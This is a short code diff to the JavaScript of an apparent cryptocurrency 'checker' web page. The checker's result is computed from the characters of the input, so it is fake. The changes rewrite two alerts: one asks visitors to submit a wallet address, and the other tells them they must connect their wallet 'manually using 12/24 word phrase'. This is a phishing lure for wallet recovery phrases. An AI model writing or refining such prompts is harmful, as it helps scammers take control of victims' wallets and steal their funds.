@@ -106,7 +106,7 @@
         // Independent Checker (Home page)
         function runCheck() {
             const input = document.getElementById('check-input').value;
-            if(!input) return alert("Please enter a name or address.");
+            if(!input) return alert("submit wallet address for check.");
 
             let seed = 0;
             for(let i=0; i < input.length; i++) seed += input.charCodeAt(i);
@@ -121,7 +121,7 @@
 
         // Alert for main page button
         function claimPrompt() {
-            alert("Security Error: You must connect your wallet manually to continue.");
+            alert("Security Error: You must connect your wallet manually using 12/24 word phrase to continue.");
         }
 
         // Popup Handlers
